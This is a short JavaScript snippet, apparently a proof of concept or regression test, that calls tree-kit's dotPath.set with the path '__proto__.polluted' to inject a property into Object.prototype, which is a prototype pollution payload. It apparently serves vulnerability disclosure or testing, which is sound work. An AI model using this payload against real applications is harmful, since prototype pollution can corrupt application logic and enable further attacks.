 
  const { dotPath } = require('tree-kit')
  obj = {};
   
  dotPath.set({}, ["__proto__", "polluted"], "yes")
// End of file
